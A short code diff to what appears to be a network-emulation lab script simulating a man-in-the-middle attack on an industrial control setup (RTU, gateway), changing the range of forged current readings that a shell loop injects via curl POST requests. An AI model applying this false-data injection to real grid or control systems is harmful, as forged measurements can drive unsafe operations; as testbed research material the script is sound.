@@ -45,6 +45,7 @@ def _append_trace(run_id, event, detail, phase="post_attack"):
         "",
         "",
         "",
+        "",
         detail,
     ])
 
@@ -104,7 +105,7 @@ def run_mitm_attack(net, rtu_name=DEFAULT_RTU_NAME, gateway_name=DEFAULT_GATEWAY
         "echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: starting url=$URL\"; "
         "while true; do "
         "  for b in 1 2 3 4 5; do "
-        "    i=$(python3 -c \"import random; print(round(random.uniform(950.0,1350.0),3))\"); "
+        "    i=$(python3 -c \"import random; print(round(random.uniform(1800.0,2600.0),3))\"); "
         "    body=$(python3 -c \"import json,sys; b=int(sys.argv[1]); i=float(sys.argv[2]); print(json.dumps({\\\"token\\\":\\\"lab-sim-token\\\",\\\"bus\\\":b,\\\"i\\\":i,\\\"ttl\\\":8}))\" \"$b\" \"$i\"); "
         "    echo \"[\"$(date \"+%Y-%m-%d %H:%M:%S\")\"] [h5] injector: try bus=$b i=$i\"; "
         "    if out=$(curl -sS -m 3 -X POST -H \"Content-Type: application/json\" -d \"$body\" \"$URL\"); then "
